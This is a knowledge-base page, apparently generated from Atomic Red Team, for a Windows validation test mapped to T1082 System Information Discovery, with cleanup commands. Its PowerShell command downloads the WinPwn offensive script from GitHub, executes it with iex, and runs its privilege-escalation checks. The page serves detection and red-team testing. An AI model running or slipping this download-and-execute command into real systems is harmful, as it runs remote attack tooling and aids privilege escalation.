---
atomic_guid: "345cb8e4-d2de-4011-a580-619cf5a9e2d7"
title: "WinPwn - Powersploits privesc checks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1082"
attack_technique_name: "System Information Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "345cb8e4-d2de-4011-a580-619cf5a9e2d7"
  - "WinPwn - Powersploits privesc checks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Powersploits privesc checks

Powersploits privesc checks using oldchecks function of WinPwn

## Metadata

- Atomic GUID: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
- Technique: T1082: System Information Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1082/T1082.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1082-system_information_discovery|T1082]]

## Executor

- name: powershell

### Command

```powershell
$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput
```

### Cleanup

```powershell
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml)
